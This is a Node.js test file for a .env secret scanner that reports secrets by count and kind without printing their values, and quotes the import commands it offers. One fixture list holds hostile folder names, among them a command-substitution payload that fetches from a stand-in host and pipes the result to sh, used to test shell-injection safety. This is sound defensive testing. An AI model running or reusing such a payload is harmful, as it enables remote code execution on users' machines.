// @ts-check
// The .env scan: secrets counted by name and kind, never a value; templates and plain config are not offered.

import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import crypto from "node:crypto";
import { scanEnvFiles } from "./envscan.js";
import { SCRATCH } from "../../test/scratch.mjs";

const fake = label => `fixture-${label}-${crypto.randomBytes(12).toString("hex")}`;

test("envscan: finds .env files with secrets across project folders, by count and kind, never a value", t => {
  const root = fs.mkdtempSync(path.join(SCRATCH, "vyre-envscan-"));
  t.after(() => fs.rmSync(root, { recursive: true, force: true }));
  const a = path.join(root, "bakery"), b = path.join(root, "harlow", "apps", "web");
  fs.mkdirSync(a, { recursive: true }); fs.mkdirSync(b, { recursive: true });
  fs.mkdirSync(path.join(a, "node_modules", "x"), { recursive: true });
  const secret = `sk-ant-${fake("anthropic").replace(/fixture-/, "")}0123456789abcdef`;
  fs.writeFileSync(path.join(a, ".env"), `PORT=3000\nNODE_ENV=production\nANTHROPIC_API_KEY=${secret}\nDATABASE_URL=postgres://alex:${fake("pw")}@db.example.test/app\n`);
  fs.writeFileSync(path.join(b, ".env.local"), `STRIPE_SECRET_KEY=${["sk", "live", fake("stripe")].join("_")}\n`);
  fs.writeFileSync(path.join(a, ".env.example"), "ANTHROPIC_API_KEY=your-key-here\n");
  fs.writeFileSync(path.join(a, "node_modules", "x", ".env"), `TOKEN=${fake("ignored")}\n`);
  fs.mkdirSync(path.join(root, "plain")); fs.writeFileSync(path.join(root, "plain", ".env"), "PORT=3000\nDEBUG=true\n");

  const r = scanEnvFiles([{ project: "bakery", dir: a }, { project: "harlow", dir: path.join(root, "harlow") }, { project: "plain", dir: path.join(root, "plain") }, { dir: path.join(root, "missing") }]);
  assert.deepEqual(r.files.map(f => [f.project, path.basename(f.file)]), [["bakery", ".env"], ["harlow", ".env.local"]], "only files with secrets; no template, no node_modules, no plain config");
  assert.equal(r.templates, 1);
  assert.ok(r.files[0].secrets >= 1 && r.files[1].secrets >= 1);
  assert.deepEqual(r.files[0].offer, { tool: "vault.import", input: { file: r.files[0].file, rewrite: true } });
  assert.match(r.files[0].command, /^vyre vault import '.*\.env' --rewrite$/);
  const text = JSON.stringify(r);
  assert.ok(!text.includes(secret) && !text.includes("postgres://"), "no value in the answer");
  // The same folder twice is listed once.
  assert.equal(scanEnvFiles([{ dir: a }, { dir: a }]).files.length, 1);
});

test("envscan: a folder named like a shell command never becomes one; a newline in a path gets no printable line", t => {
  const root = fs.mkdtempSync(path.join(SCRATCH, "vyre-envscan-"));
  t.after(() => fs.rmSync(root, { recursive: true, force: true }));
  const nasty = ["x$(curl evil.test|sh)", "a;b&c|d`e`", "it's", "a b"];
  const secret = `sk-ant-${fake("anthropic").replace(/fixture-/, "")}0123456789abcdef`;
  for (const n of nasty) { const d = path.join(root, n); fs.mkdirSync(d); fs.writeFileSync(path.join(d, ".env"), `ANTHROPIC_API_KEY=${secret}\n`); }
  const withNewline = path.join(root, "line\nbreak"); fs.mkdirSync(withNewline); fs.writeFileSync(path.join(withNewline, ".env"), `ANTHROPIC_API_KEY=${secret}\n`);
  const r = scanEnvFiles([{ dir: root }]);
  assert.equal(r.files.length, nasty.length + 1);
  for (const f of r.files) {
    if (f.unsafePath) { assert.equal(f.command, null); assert.equal(f.offer, null); assert.ok(!/[\n\r]/.test(f.file)); continue; }
    // Inside POSIX single quotes nothing is special: the path is one word to the shell, whatever it holds.
    const inner = f.command.slice("vyre vault import ".length, -" --rewrite".length);
    assert.ok(inner.startsWith("'") && inner.endsWith("'"), f.command);
    assert.equal(inner.slice(1, -1).replace(/'\\''/g, "'"), f.file, "the quoted word is exactly the path");
    assert.equal(f.offer.input.file, f.file);
  }
  assert.ok(r.files.some(f => f.unsafePath), "the newline path is flagged");
});
